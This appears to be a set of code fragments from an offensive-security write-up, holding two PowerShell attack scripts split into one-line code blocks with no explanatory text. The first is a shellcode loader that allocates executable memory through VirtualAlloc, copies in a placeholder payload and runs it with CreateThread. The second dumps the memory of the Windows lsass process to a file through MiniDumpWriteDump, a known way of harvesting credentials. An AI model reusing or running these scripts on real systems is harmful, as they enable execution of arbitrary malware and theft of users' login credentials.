["```\n$signatures = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); \n```", "```\n[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId); \n```", "```\n[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'; \n```", "```\n$functionImport = Add-Type -MemberDefinition $signatures -Name \"Win32\" -NameSpace Win32Functions -PassThru;\n```", "```\n[Byte[]] $shellcode = <Tasty Bytes Go Here>; \n```", "```\n$size = $shellcode.Length\n```", "```\n$allocSpace = $functionImport::VirtualAlloc(0, $size, 0x3000, 0x40);\n```", "```\nFor ($position = 0; $position -le ($shellcode.Length - 1); $position++) { \n```", "```\n    $functionImport::memset([IntPtr]($allocSpace.ToInt32() + $position), $shellcode[$position], 1) \n```", "```\n};\n```", "```\n$functionImport::CreateThread(0, 0, $allocSpace, 0, 0, 0); \n```", "```\nWhile ($true) { \n```", "```\n    Start-Sleep 120 \n```", "```\n};\n```", "```\n$WinErrRep = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')\n```", "```\n$werNativeMethods = $WinErrRep.GetNestedType('NativeMethods', 'NonPublic')\n```", "```\n$Flags = [Reflection.BindingFlags] 'NonPublic, Static'\n```", "```\n$MiniDumpWriteDump = $werNativeMethods.GetMethod('MiniDumpWriteDump', $Flags)\n```", "```\n$MiniDumpfull = [UInt32] 2\n```", "```\n$lsass = Get-Process lsass\n```", "```\n$ProcessId = $lsass.Id\n```", "```\n$ProcessName = $lsass.Name\n```", "```\n$ProcessHandle = $lsass.Handle\n```", "```\n$ProcessFileName = \"$Home\\Desktop\\pirate_booty.dmp\"\n```", "```\n$FileStream = New-Object IO.FileStream($ProcessFileName, [IO.FileMode]::Create)\n```", "```\n$Result = $MiniDumpWriteDump.Invoke($null, @(\n```", "```\n    $ProcessHandle,\n```", "```\n    $ProcessId,\n```", "```\n    $FileStream.SafeFileHandle,\n```", "```\n    $MiniDumpfull,\n```", "```\n    [IntPtr]::Zero,\n```", "```\n    [IntPtr]::Zero,\n```", "```\n    [IntPtr]::Zero))\n```", "```\n$FileStream.Close()\n```", "```\nIf (-not $Result) {\n```", "```\n    $Exception = New-Object ComponentModel.Win32Exception\n```", "```\n    $ExceptionMessage = \"$($Exception.Message) ($($ProcessName):$($ProcessId))\"\n```", "```\n    Remove-Item $ProcessFileName -ErrorAction SilentlyContinue\n```", "```\n    Throw $ExceptionMessage\n```", "```\n} Else {\n```", "```\n    Exit\n```", "```\n}\n```"]